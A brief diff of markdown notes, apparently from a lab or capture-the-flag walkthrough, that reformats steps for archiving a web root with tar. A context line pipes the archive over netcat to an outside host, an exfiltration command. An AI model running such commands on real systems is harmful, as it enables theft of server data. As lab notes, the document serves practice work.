@@ -192,8 +192,8 @@ UserGroups:
 
 ## Get the /var/www/html files
 
-- in /var/www wrap html first
-tar -czf html.tar.gz html
+in /var/www wrap html first
+> tar -czf html.tar.gz html
 
 **server**
 > cat html.tar.gz | nc 10.10.14.69 *any port*
